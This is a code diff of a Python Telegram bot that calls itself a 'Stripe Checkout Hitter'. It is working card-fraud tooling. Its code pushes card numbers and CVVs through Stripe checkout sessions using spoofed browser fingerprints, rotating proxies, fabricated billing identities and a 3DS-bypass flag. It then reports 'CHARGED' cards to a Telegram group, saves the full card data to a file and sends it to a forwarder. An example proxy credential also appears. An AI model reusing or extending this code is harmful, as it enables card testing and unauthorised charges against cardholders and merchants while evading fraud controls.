@@ -13884,42 +13884,45 @@ def format_proxy_stco(proxy: str) -> Optional[str]:
     parts = proxy.split(':')
     
     if len(parts) == 4:
-        # Check which format it is
+        # ============ FIXED: Detect which format it is ============
         # Format 1: host:port:user:pass (host has dots, port is numeric)
+        # Example: p104.instantproxies.com:8901:7274:JjoY3iUMaAGZ
         if '.' in parts[0] and parts[1].isdigit():
             host, port, user, password = parts
+            # User is usually numeric or alphanumeric, but it's NOT the port
             return f"http://{user}:{password}@{host}:{port}"
         
         # Format 2: user:pass:host:port (last part is port)
+        # Example: user:pass:host:port
         elif parts[3].isdigit():
             user, password, host, port = parts
             return f"http://{user}:{password}@{host}:{port}"
         
-        # Try to detect by checking which part looks like a port
-        for i, part in enumerate(parts):
-            if part.isdigit() and 1 <= int(part) <= 65535:
-                if i == 1:
-                    # host:port:user:pass
-                    host = parts[0]
-                    port = parts[1]
-                    user = parts[2] if len(parts) > 2 else ''
-                    password = parts[3] if len(parts) > 3 else ''
-                    if user and password:
-                        return f"http://{user}:{password}@{host}:{port}"
-                    return f"http://{host}:{port}"
-                elif i == 3:
-                    # user:pass:host:port
-                    user = parts[0]
-                    password = parts[1]
-                    host = parts[2]
-                    port = parts[3]
-                    if user and password:
-                        return f"http://{user}:{password}@{host}:{port}"
-                    return f"http://{host}:{port}"
+        # Format 3: host:port:user:pass but host doesn't have dots
+        # Try to detect by checking which part looks like a host
+        else:
+            # Check if any part looks like a host (contains dots)
+            host_index = -1
+            for i, part in enumerate(parts):
+                if '.' in part:
+                    host_index = i
+                    break
+            
+            if host_index == 0:
+                # host:port:user:pass
+                host, port, user, password = parts
+                return f"http://{user}:{password}@{host}:{port}"
+            elif host_index == 2:
+                # user:pass:host:port
+                user, password, host, port = parts
+                return f"http://{user}:{password}@{host}:{port}"
+            else:
+                # Default: assume host:port:user:pass
+                host, port, user, password = parts
+                return f"http://{user}:{password}@{host}:{port}"
     
     # ============ HANDLE user:pass@host:port format ============
     if '@' in proxy:
-        # Already in correct format, just add http:// if needed
         if not proxy.startswith(('http://', 'https://')):
             return f"http://{proxy}"
         return proxy
@@ -13928,6 +13931,14 @@ def format_proxy_stco(proxy: str) -> Optional[str]:
     if len(parts) == 2 and parts[1].isdigit():
         return f"http://{proxy}"
     
+    # ============ HANDLE host:port:user:pass but with different separator ============
+    # Try regex to extract
+    import re
+    match = re.search(r'([a-zA-Z0-9\.-]+):(\d+):([a-zA-Z0-9]+):([a-zA-Z0-9]+)', proxy)
+    if match:
+        host, port, user, password = match.groups()
+        return f"http://{user}:{password}@{host}:{port}"
+    
     # If we can't parse it, try the global formatter
     formatted = format_proxy(proxy)
     if formatted:
@@ -13935,7 +13946,6 @@ def format_proxy_stco(proxy: str) -> Optional[str]:
     
     print(f"⚠️ Could not format proxy: {proxy[:50]}...")
     return None
-
 
 def mask_proxy_stco(proxy: str) -> str:
     """Mask proxy for display - safe version"""
@@ -14245,7 +14255,7 @@ async def get_checkout_session_stco(cs_id: str, pk: str, proxy: str = None) -> D
         print(f"❌ Error getting session: {e}")
         return {}
 
-# ============ CHARGE SINGLE CARD ============
+
 
 # ============ UPDATED CHARGE FUNCTION - FIXED EMAIL ============
 
@@ -14271,7 +14281,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             result["status"] = "ERROR"
             result["response"] = "Invalid card format"
             result["time"] = round(time.perf_counter() - start, 2)
-            print(f"❌ Invalid card format: {card}")
+            debug_print(1, f"❌ Invalid card format: {card}")
             return result
     elif isinstance(card, dict):
         result["card"] = f"{card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}"
@@ -14279,54 +14289,56 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
         result["status"] = "ERROR"
         result["response"] = "Invalid card type"
         result["time"] = round(time.perf_counter() - start, 2)
-        print(f"❌ Invalid card type: {type(card)}")
+        debug_print(1, f"❌ Invalid card type: {type(card)}")
         return result
 
     pk = checkout_data.get("pk")
     cs = checkout_data.get("cs")
+    raw_url = checkout_data.get("raw_url")
+    display_info = checkout_data.get("display_info", {})
 
     if not pk or not cs:
         result["status"] = "FAILED"
         result["response"] = "No checkout data (missing PK or CS)"
         result["time"] = round(time.perf_counter() - start, 2)
-        print(f"❌ Missing PK or CS")
+        debug_print(1, f"❌ Missing PK or CS")
         return result
 
-    # ============ USE SESSION EMAIL INSTEAD OF GENERATING NEW ============
+    # Format proxy
+    proxy_url = None
+    if proxy_str:
+        proxy_url = format_proxy_stco(proxy_str)
+        if proxy_url:
+            # Validate proxy format
+            try:
+                clean_proxy = proxy_url.replace('http://', '').replace('https://', '')
+                if '@' in clean_proxy:
+                    host_port = clean_proxy.split('@')[1]
+                else:
+                    host_port = clean_proxy
+                if ':' in host_port:
+                    host, port = host_port.rsplit(':', 1)
+                    int(port)  # Validate port is a number
+                    debug_print(2, f"🔌 Using proxy: {mask_proxy(proxy_url)}")
+                else:
+                    debug_print(1, f"⚠️ Invalid proxy format, using direct connection")
+                    proxy_url = None
+            except (ValueError, IndexError) as e:
+                debug_print(1, f"⚠️ Invalid proxy: {e}, using direct connection")
+                proxy_url = None
+        else:
+            debug_print(1, f"⚠️ Could not format proxy, using direct connection")
+            proxy_url = None
+    else:
+        debug_print(2, f"🔌 No proxy - direct connection")
+
+    # Get session email
     customer_email = session_data.get("customer_email", "")
-    
-    # If no email in session, use a fallback
     if not customer_email:
         customer_email = "user@gmail.com"
         print(f"⚠️ No email in session, using fallback: {customer_email}")
     else:
         print(f"📧 Using session email: {customer_email}")
-
-    # Generate name from email or use generic
-    if '@' in customer_email:
-        name_part = customer_email.split('@')[0]
-        name_parts = name_part.replace('.', ' ').replace('_', ' ').split()
-        if len(name_parts) >= 2:
-            first_name = name_parts[0].capitalize()
-            last_name = name_parts[1].capitalize()
-        else:
-            first_name = name_part[:8].capitalize() if len(name_part) > 4 else "User"
-            last_name = "Customer"
-    else:
-        first_name = "Test"
-        last_name = "User"
-    
-    full_name = f"{first_name} {last_name}"
-    print(f"👤 Customer: {full_name}")
-    print(f"📧 Email: {customer_email}")
-
-    # ============ TLS BYPASS CLIENT ============
-    client = await stco_tls.get_client(proxy_str)
-    
-    if proxy_str:
-        print(f"🔌 Using proxy: {mask_proxy_stco(proxy_str)}")
-    else:
-        print(f"🔌 No proxy - direct connection")
 
     for attempt in range(max_retries + 1):
         attempt_start = time.perf_counter()
@@ -14338,169 +14350,231 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             year = card.get('year', '')
             cvv = card.get('cvv', '')
             
-            # Format year
-            if len(year) == 2:
-                year_full = f"20{year}"
-            else:
-                year_full = year
+            debug_print(2, f"🔄 Attempt {attempt + 1}/{max_retries + 1}")
+            debug_print(3, f"💳 Card: {cc[:6]}****** | {month}/{year} | CVV: {cvv}")
             
-            print(f"🔄 Attempt {attempt + 1}/{max_retries + 1}")
-            print(f"💳 Card: {cc[:6]}****** | {month}/{year_full} | CVV: {cvv}")
-            
-            fp = {
-                'ua': get_random_user_agent_stco(),
-                'stripe_js': get_stripe_js_version_stco(),
-            }
-            
-            guid = generate_guid_stco()
-            muid = generate_muid_stco()
-            sid = generate_sid_stco()
-            sess_id = generate_client_session_id_stco()
-            elem_sess = generate_elements_session_id_stco()
-            
+            fp = rand_profile()
+            guid = generate_guid()
+            muid = generate_muid()
+            sid = generate_sid()
+            sess_id = generate_client_session_id()
+            elem_sess = generate_elements_session_id()
+            config_id = generate_elements_config_id()
+
+            debug_print(4, f"🔐 Fingerprint: {fp['chrome_full']} | {fp['platform']}")
+
             # ============ GET FRESH INIT DATA ============
-            print(f"📡 Getting fresh init data...")
+            debug_print(3, f"📡 Getting fresh init data...")
             
-            try:
-                init_url = f"https://api.stripe.com/v1/payment_pages/{cs}/init"
-                init_body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
-                
-                init_response = await client.post(
-                    init_url,
-                    data=init_body,
-                    headers={
-                        'Accept': 'application/json',
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Origin': 'https://checkout.stripe.com',
-                        'Referer': 'https://checkout.stripe.com/',
-                        'User-Agent': fp['ua'],
-                    }
-                )
-                
-                if init_response.status_code != 200:
-                    print(f"❌ Init request failed: {init_response.status_code}")
-                    attempt_data["status"] = "failed"
-                    attempt_data["error"] = f"Init failed: {init_response.status_code}"
-                    result["attempts"].append(attempt_data)
-                    if attempt < max_retries:
-                        await asyncio.sleep(2)
-                        continue
-                    result["status"] = "SESSION_ERROR"
-                    result["response"] = "Failed to initialize Stripe Checkout session"
-                    result["time"] = round(time.perf_counter() - start, 2)
-                    return result
-                
-                init_data = init_response.json()
-                
-                if "error" in init_data:
-                    print(f"❌ Init error: {init_data['error']}")
-                    attempt_data["status"] = "failed"
-                    attempt_data["error"] = init_data['error']
-                    result["attempts"].append(attempt_data)
-                    if attempt < max_retries:
-                        await asyncio.sleep(2)
-                        continue
-                    result["status"] = "SESSION_ERROR"
-                    result["response"] = init_data['error']
-                    result["time"] = round(time.perf_counter() - start, 2)
-                    return result
-                    
-            except Exception as e:
-                print(f"❌ Init exception: {e}")
+            fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(cs, pk, proxy_url)
+            
+            # If fresh init fails, try to re-decode from URL
+            if fresh_init_data is None and raw_url:
+                debug_print(3, f"🔄 Fresh init failed, re-decoding from raw URL...")
+                fresh_checkout = await get_checkout_info_stripe(raw_url)
+                if fresh_checkout and fresh_checkout.get("is_valid"):
+                    fresh_pk = fresh_checkout.get("pk")
+                    fresh_cs = fresh_checkout.get("cs")
+                    if fresh_pk and fresh_cs:
+                        fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(fresh_cs, fresh_pk, proxy_url)
+            
+            # Check if fresh_init_data is None
+            if fresh_init_data is None:
+                debug_print(1, f"❌ Failed to get fresh init data on attempt {attempt + 1}")
                 attempt_data["status"] = "failed"
-                attempt_data["error"] = str(e)
+                attempt_data["error"] = "Fresh init failed"
                 result["attempts"].append(attempt_data)
+                
                 if attempt < max_retries:
+                    # If proxy error, try without proxy
+                    if proxy_url and "proxy" in str(init_response or "").lower():
+                        debug_print(3, f"🔄 Proxy error, retrying without proxy...")
+                        proxy_url = None
+                    else:
+                        debug_print(3, f"⏳ Waiting 2s before retry...")
                     await asyncio.sleep(2)
                     continue
                 result["status"] = "SESSION_ERROR"
-                result["response"] = str(e)[:100]
+                result["response"] = "Failed to initialize Stripe Checkout session after retries"
                 result["time"] = round(time.perf_counter() - start, 2)
+                debug_print(1, f"❌ {result['response']}")
                 return result
             
+            pk = fresh_pk
+            cs = fresh_cs
+            init_data = fresh_init_data
+            
+            debug_print(3, f"✅ Fresh init data obtained")
+            
+            # ============ GET THE CORRECT AMOUNT ============
+            lig = init_data.get("line_item_group") or {}
+            inv = init_data.get("invoice") or {}
+            subscription = init_data.get("subscription") or {}
+            subscription_data = init_data.get("subscription_data") or {}
+            
+            total = 0
+            subtotal = 0
+            
+            if lig:
+                total = lig.get("total", 0)
+                subtotal = lig.get("subtotal", 0)
+                debug_print(3, f"💰 Total from line_item_group: {total/100:.2f} {lig.get('currency', 'USD')}")
+            elif inv:
+                total = inv.get("total", 0)
+                subtotal = inv.get("subtotal", 0)
+                debug_print(3, f"💰 Total from invoice: {total/100:.2f} {inv.get('currency', 'USD')}")
+            elif subscription:
+                total = subscription.get("amount", 0)
+                subtotal = total
+                debug_print(3, f"💰 Total from subscription: {total/100:.2f}")
+            elif subscription_data:
+                total = subscription_data.get("amount", 0)
+                subtotal = total
+                debug_print(3, f"💰 Total from subscription_data: {total/100:.2f}")
+            else:
+                pi = init_data.get("payment_intent") or {}
+                total = pi.get("amount", 0)
+                subtotal = total
+                debug_print(3, f"💰 Total from payment_intent: {total/100:.2f}")
+            
+            # If still 0, try to get from session data
+            if total == 0:
+                total = session_data.get("amount", 0)
+                subtotal = total
+                debug_print(3, f"💰 Total from session_data: {total/100:.2f}")
+            
+            # If still 0, try from display info
+            if total == 0 and display_info:
+                price = display_info.get("price", 0)
+                if price:
+                    total = int(price * 100)
+                    subtotal = total
+                    debug_print(3, f"💰 Total from display_info: {total/100:.2f}")
+            
+            # For subscriptions, check the plan amount
+            if init_data.get("mode") == "subscription":
+                sub_plan = init_data.get("subscription_data", {}).get("plan", {})
+                if sub_plan and sub_plan.get("amount"):
+                    total = sub_plan.get("amount", total)
+                    subtotal = total
+                    debug_print(3, f"💰 Total from subscription plan: {total/100:.2f}")
+
+            # Get checksum
             checksum = init_data.get("init_checksum", "")
-            total = init_data.get("line_item_group", {}).get("total", 0)
+
+            # Generate billing details
+            billing = generate_fresh_billing_details()
+            
+            # Use session email
+            billing['email'] = customer_email
+            
+            # Generate name from email
+            if '@' in customer_email:
+                name_part = customer_email.split('@')[0]
+                name_parts = name_part.replace('.', ' ').replace('_', ' ').split()
+                if len(name_parts) >= 2:
+                    first_name = name_parts[0].capitalize()
+                    last_name = name_parts[1].capitalize()
+                else:
+                    first_name = name_part[:8].capitalize() if len(name_part) > 4 else "User"
+                    last_name = "Customer"
+            else:
+                first_name = "Test"
+                last_name = "User"
+            
+            billing['full_name'] = f"{first_name} {last_name}"
+            
+            debug_print(3, f"👤 Customer: {billing['full_name']}")
+            debug_print(3, f"📧 Email: {billing['email']}")
 
             # ============ BUILD CONFIRM PARAMS ============
-            # IMPORTANT: Use the session's pre-set email
             confirm_params = [
                 ("eid", "NA"),
                 ("payment_method_data[type]", "card"),
                 ("payment_method_data[card][number]", cc),
                 ("payment_method_data[card][cvc]", cvv),
                 ("payment_method_data[card][exp_month]", month),
-                ("payment_method_data[card][exp_year]", year_full),
+                ("payment_method_data[card][exp_year]", year),
                 ("payment_method_data[allow_redisplay]", "unspecified"),
-                ("payment_method_data[billing_details][name]", full_name),
-                ("payment_method_data[billing_details][email]", customer_email),  # USE SESSION EMAIL
-                ("payment_method_data[billing_details][address][country]", "US"),
-                ("payment_method_data[billing_details][address][postal_code]", "10010"),
+                ("payment_method_data[billing_details][name]", billing['full_name']),
+                ("payment_method_data[billing_details][email]", billing['email']),
+                ("payment_method_data[billing_details][address][country]", billing['country']),
+                ("payment_method_data[billing_details][address][line1]", billing['address']),
+                ("payment_method_data[billing_details][address][city]", billing['city']),
+                ("payment_method_data[billing_details][address][state]", billing['state']),
+                ("payment_method_data[billing_details][address][postal_code]", billing['zip_code']),
                 ("payment_method_data[pasted_fields]", "number"),
-                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; checkout"),
-                ("payment_method_data[referrer]", "https://checkout.stripe.com"),
+                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; payment-element"),
+                ("payment_method_data[referrer]", "https://merchant.example.com"),
                 ("payment_method_data[time_on_page]", str(random.randint(30000, 200000))),
                 ("payment_method_data[client_attribution_metadata][client_session_id]", sess_id),
-                ("payment_method_data[client_attribution_metadata][checkout_session_id]", cs),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_source]", "elements"),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_subtype]", "payment-element"),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_version]", "2021"),
-                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "deferred"),
+                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "standard"),
                 ("payment_method_data[client_attribution_metadata][payment_method_selection_flow]", "automatic"),
                 ("payment_method_data[client_attribution_metadata][elements_session_id]", elem_sess),
-                ("payment_method_data[client_attribution_metadata][elements_session_config_id]", f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"),
-                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "paymentForm"),
-                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][1]", "currencySelector"),
-                ("guid", guid),
-                ("muid", muid),
-                ("sid", sid),
-                ("init_checksum", checksum),
-                ("version", fp['stripe_js']),
+                ("payment_method_data[client_attribution_metadata][elements_session_config_id]", config_id),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "payment"),
+                ("payment_method_data[guid]", guid),
+                ("payment_method_data[muid]", muid),
+                ("payment_method_data[sid]", sid),
                 ("expected_amount", str(total)),
-                ("last_displayed_line_item_group_details[subtotal]", str(total)),
+                ("last_displayed_line_item_group_details[subtotal]", str(subtotal)),
                 ("last_displayed_line_item_group_details[total_exclusive_tax]", "0"),
                 ("last_displayed_line_item_group_details[total_inclusive_tax]", "0"),
                 ("last_displayed_line_item_group_details[total_discount_amount]", "0"),
                 ("last_displayed_line_item_group_details[shipping_rate_amount]", "0"),
                 ("expected_payment_method_type", "card"),
                 ("key", pk),
+                ("init_checksum", checksum),
             ]
 
             if bypass_3ds:
                 confirm_params.append(("return_url", "https://checkout.stripe.com"))
 
-            body = urllib.parse.urlencode(confirm_params)
-
-            # ============ CONFIRM PAYMENT ============
-            confirm_headers = {
+            # ============ FRESH HEADERS PER ATTEMPT ============
+            elements_headers = {
                 "Accept": "application/json",
-                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Language": fp["lang"],
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Origin": "https://js.stripe.com",
                 "Referer": "https://js.stripe.com/",
-                "User-Agent": fp["ua"],
-                "sec-ch-ua": '"Google Chrome";v="151", "Chromium";v="151", "Not=A?Brand";v="99"',
+                "sec-ch-ua": fp["sec_ch_ua"],
                 "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": '"Windows"',
+                "sec-ch-ua-platform": fp["platform"],
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-site",
+                "User-Agent": fp["ua"],
                 "priority": "u=1, i",
+                "dnt": "1",
             }
 
-            confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
+            body = urlencode(confirm_params)
             
-            response = await client.post(
-                confirm_url,
-                headers=confirm_headers,
-                content=body
-            )
-
-            try:
+            debug_print(3, f"📤 Sending confirm request for session {cs[:20]}...")
+            debug_print(4, f"📤 Headers: {json.dumps(elements_headers, indent=2)}")
+            
+            # ============ FRESH HTTP CLIENT PER ATTEMPT ============
+            client_kwargs = {
+                'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
+                'verify': False,
+                'follow_redirects': True,
+            }
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+            
+            async with httpx.AsyncClient(**client_kwargs) as client:
+                response = await client.post(
+                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                    headers=elements_headers,
+                    content=body
+                )
                 conf = response.json()
-            except:
-                conf = {}
-
-            print(f"📥 Confirm response status: {response.status_code}")
+            
+            debug_print(3, f"📥 Confirm response status: {response.status_code}")
+            debug_print(4, f"📥 Confirm response: {json.dumps(conf, indent=2)[:1000]}...")
             
             attempt_data["status"] = "completed"
             attempt_data["response"] = conf
@@ -14511,13 +14585,26 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 error_msg = err.get("message", "Failed")
                 error_code = err.get("code", "")
                 
-                print(f"❌ Stripe Error: {error_code} - {error_msg}")
+                debug_print(1, f"❌ Stripe Error: {error_code} - {error_msg}")
+                debug_print(4, f"📋 Full error: {json.dumps(err, indent=2)}")
                 
                 attempt_data["error"] = error_msg
                 attempt_data["error_code"] = error_code
                 result["attempts"].append(attempt_data)
                 
-                # Handle card decline
+                # ============ FIX: Handle amount mismatch error ============
+                if error_code == "checkout_amount_mismatch":
+                    debug_print(1, f"⚠️ Amount mismatch detected, retrying with correct amount...")
+                    # Try to get the amount from the error response
+                    if attempt < max_retries:
+                        await asyncio.sleep(1)
+                        continue
+                    result["status"] = "AMOUNT_MISMATCH"
+                    result["response"] = f"Amount mismatch: {error_msg}"
+                    result["time"] = round(time.perf_counter() - start, 2)
+                    return result
+                
+                # Check for card decline
                 if "card_declined" in error_msg.lower() or "declined" in error_msg.lower():
                     dc = err.get("decline_code", "")
                     if "insufficient" in error_msg.lower() or "funds" in error_msg.lower():
@@ -14529,70 +14616,110 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     else:
                         result["status"] = "DECLINED"
                         result["response"] = f"{dc.upper()}: {error_msg}" if dc else error_msg
+                elif "expired" in error_msg.lower():
+                    result["status"] = "SESSION_EXPIRED"
+                    result["response"] = f"Checkout session expired: {error_msg}"
                 else:
                     result["status"] = "ERROR"
                     result["response"] = error_msg
                 
                 result["time"] = round(time.perf_counter() - start, 2)
+                debug_print(2, f"📊 Final result: {result['status']} - {result['response']}")
                 return result
             else:
                 pi = conf.get("payment_intent") or {}
                 st = pi.get("status", "") or conf.get("status", "")
                 
-                print(f"📊 Payment Intent status: {st}")
+                debug_print(3, f"📊 Payment Intent status: {st}")
+                debug_print(4, f"📋 Payment Intent: {json.dumps(pi, indent=2)[:500]}...")
                 
                 if st == "succeeded":
                     result["status"] = "CHARGED"
                     result["response"] = "Payment Successful"
-                    print(f"✅✅✅ CHARGED SUCCESSFULLY! ✅✅✅")
+                    debug_print(2, f"✅✅✅ CHARGED SUCCESSFULLY! ✅✅✅")
                 elif st == "requires_action":
                     result["status"] = "3DS" if not bypass_3ds else "3DS SKIP"
                     result["response"] = "3DS Required" if not bypass_3ds else "3DS Cannot be bypassed"
-                    print(f"🔐 3DS Required")
+                    debug_print(2, f"🔐 3DS Required")
                 elif st == "requires_payment_method":
                     result["status"] = "DECLINED"
                     result["response"] = "Card Declined"
-                    print(f"❌ Card Declined")
+                    debug_print(2, f"❌ Card Declined")
                 else:
                     result["status"] = "UNKNOWN"
                     result["response"] = st or "Unknown"
+                    debug_print(2, f"⚠️ Unknown status: {st}")
 
                 result["time"] = round(time.perf_counter() - start, 2)
+                debug_print(2, f"📊 Final result: {result['status']} - {result['response']}")
                 return result
 
         except httpx.TimeoutException as e:
-            print(f"⏰ Timeout on attempt {attempt + 1}: {e}")
+            debug_print(1, f"⏰ Timeout on attempt {attempt + 1}: {e}")
             attempt_data["status"] = "timeout"
             attempt_data["error"] = str(e)
             result["attempts"].append(attempt_data)
             
             if attempt < max_retries:
+                # If proxy timeout, try without proxy
+                if proxy_url:
+                    debug_print(3, f"🔄 Proxy timeout, retrying without proxy...")
+                    proxy_url = None
+                else:
+                    debug_print(3, f"⏳ Waiting 2s before retry...")
                 await asyncio.sleep(2)
                 continue
             result["status"] = "TIMEOUT"
             result["response"] = f"Request timeout: {str(e)[:50]}"
             result["time"] = round(time.perf_counter() - start, 2)
+            debug_print(1, f"❌ {result['response']}")
             return result
             
-        except Exception as e:
-            print(f"⚠️ Error on attempt {attempt + 1}: {str(e)[:100]}")
-            attempt_data["status"] = "error"
+        except httpx.ProxyError as e:
+            debug_print(1, f"🔌 Proxy error on attempt {attempt + 1}: {e}")
+            attempt_data["status"] = "proxy_error"
             attempt_data["error"] = str(e)
             result["attempts"].append(attempt_data)
             
             if attempt < max_retries:
+                debug_print(3, f"🔄 Proxy error, retrying without proxy...")
+                proxy_url = None
+                await asyncio.sleep(2)
+                continue
+            result["status"] = "PROXY_ERROR"
+            result["response"] = f"Proxy error: {str(e)[:50]}"
+            result["time"] = round(time.perf_counter() - start, 2)
+            debug_print(1, f"❌ {result['response']}")
+            return result
+            
+        except Exception as e:
+            error_str = str(e)
+            debug_print(1, f"⚠️ Error on attempt {attempt + 1}: {error_str[:100]}")
+            debug_print(4, f"📋 Traceback: {traceback.format_exc()}")
+            attempt_data["status"] = "error"
+            attempt_data["error"] = error_str
+            result["attempts"].append(attempt_data)
+            
+            if attempt < max_retries:
+                # If proxy error, try without proxy
+                if "Invalid port" in error_str or "proxy" in error_str.lower():
+                    debug_print(3, f"🔄 Proxy error, retrying without proxy...")
+                    proxy_url = None
+                else:
+                    debug_print(3, f"⏳ Waiting 2s before retry...")
                 await asyncio.sleep(2)
                 continue
             result["status"] = "ERROR"
-            result["response"] = str(e)[:50]
+            result["response"] = error_str[:50]
             result["time"] = round(time.perf_counter() - start, 2)
+            debug_print(1, f"❌ {result['response']}")
             return result
 
     result["time"] = round(time.perf_counter() - start, 2)
+    debug_print(1, f"❌ All attempts failed: {result['status']} - {result['response']}")
     return result
 
 
-# ============ UPDATED /stco COMMAND WITH SESSION DATA ============
 
 # ============ FIXED STCO COMMAND WITH HIT NOTIFICATION ============
 @check_gateway("stco")
@@ -14600,7 +14727,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Stripe Checkout Hitter - /stco <url> <card>
     Uses TLS bypass and connection pooling for better performance
-    FIXED: Now sends hit notifications to the group when charged
     """
     if not await verify_group_access(update, context):
         return
@@ -14757,6 +14883,9 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     success_url = display_info.get('success_url')
     cancel_url = display_info.get('cancel_url')
+    
+    # Store display_info in checkout_data for use in charge function
+    checkout_data["display_info"] = display_info
     
     if not display_info.get("is_valid"):
         error_msg = display_info.get("error", "Checkout session is no longer active")
@@ -14938,30 +15067,76 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Get user data
             user_data = user_manager.get_user(user_id)
             username = update.effective_user.username or user_data.get('username', 'Unknown')
+            first_name = update.effective_user.first_name or 'User'
             
+            # ============ SEND NOTIFICATION WITH BLADESARKS BUTTON ============
+            if HIT_NOTIFICATION_ENABLED:
+                # Premium emojis for notification
+                diamond_emoji = pe(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+                charged_emoji = pe(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
+                
+                # ============ BLADESARKS BUTTON - LIKE SHOPIFY ============
+                keyboard = [
+                    [
+                        InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot"),
+                    ]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                
+                notification = (
+                    f"<b>Stripe Checkout</b>\n"
+                    f"<b>Amount</b> ➛ {charged_card_data['price']}\n"
+                    f"{charged_emoji} <b>Payment Successful</b>\n"
+                    f"<b>User</b> ➛ @{username}"
+                )
+                
+                # Send to your group with BUTTON
+                try:
+                    await context.bot.send_message(
+                        chat_id=HIT_NOTIFICATION_GROUP_ID,
+                        text=notification,
+                        parse_mode="HTML",
+                        reply_markup=reply_markup  # <-- ADDED BUTTON HERE
+                    )
+                    print(f"✅ Stripe hit notification sent with BLADESARKS button")
+                except Exception as e:
+                    print(f"❌ Failed to send notification: {e}")
+                    
             # Get BIN info for the card
             bin_info = await get_bin_info(charged_card_data['card'])
             
-            # Send hit notification to the group
-            await send_hit_notification(
-
-                gateway="Stripe Hitter",
+            # Save hit to file
+            await save_hit_to_file(
+                card=charged_card_data['card'],
+                gateway="Stripe Checkout",
                 response=charged_card_data['response'],
                 price=charged_card_data['price'],
-                user=user_data,
-                status_category="charged"
+                bin_info=bin_info,
+                user_id=user_id,
+                user_tier=user_manager.get_tier(user_id)
             )
             
-
-            
-            # Increment hits
             user_manager.increment_hits(user_id)
-            
-            
             
         except Exception as e:
             print(f"⚠️ [HIT NOTIFICATION] Error: {e}")
             
+        # ============ SEND TO HIT FORWARDER ============
+        try:
+            asyncio.create_task(
+                send_hit_to_forwarder(
+                    card=charged_card_data['card'],
+                    gateway="Stripe Checkout",
+                    response=charged_card_data['response'],
+                    price=charged_card_data['price'],
+                    bin_info=bin_info if 'bin_info' in locals() else None,
+                    user_id=user_id,
+                    user_tier=user_manager.get_tier(user_id),
+                    status_category="charged"
+                )
+            )
+        except Exception as e:
+            print(f"⚠️ [HIT FORWARDER] Error: {e}")
 
 
 
@@ -21767,36 +21942,182 @@ def rand_profile():
     }
 
 def generate_fresh_billing_details():
-    first_name = random.choice(FIRST_NAMES)
-    last_name = random.choice(LAST_NAMES)
+    """Generate fresh billing details for Stripe Checkout"""
+    
+    first_names = [
+        'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
+        'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew',
+        'Anthony', 'Mark', 'Donald', 'Steven', 'Paul', 'Andrew', 'Joshua',
+        'Emma', 'Olivia', 'Ava', 'Isabella', 'Sophia', 'Charlotte', 'Mia',
+        'Amelia', 'Harper', 'Evelyn', 'Abigail', 'Emily', 'Elizabeth', 'Mila',
+        'Ella', 'Avery', 'Sofia', 'Camila', 'Aria', 'Scarlett', 'Raman',
+        'Rahul', 'Rahul1', 'Raman1', 'Rahul2', 'Raman2', 'Rahul3', 'Raman3',
+        'Rahul4', 'Raman4', 'Rahul5', 'Raman5', 'Rahul6', 'Raman6', 'Rahul7',
+        'Raman7', 'Rahul8', 'Raman8', 'Rahul9', 'Raman9', 'Rahul10', 'Raman10',
+        'Rahul11', 'Raman11', 'Rahul12', 'Raman12', 'Rahul13', 'Raman13',
+        'Rahul14', 'Raman14', 'Rahul15', 'Raman15', 'Rahul16', 'Raman16',
+        'Rahul17', 'Raman17', 'Rahul18', 'Raman18', 'Rahul19', 'Raman19',
+        'Rahul20', 'Raman20', 'Rahul21', 'Raman21', 'Rahul22', 'Raman22',
+        'Rahul23', 'Raman23', 'Rahul24', 'Raman24', 'Rahul25', 'Raman25',
+        'Rahul26', 'Raman26', 'Rahul27', 'Raman27', 'Rahul28', 'Raman28',
+        'Rahul29', 'Raman29', 'Rahul30', 'Raman30',
+    ]
+    
+    last_names = [
+        'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
+        'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez',
+        'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
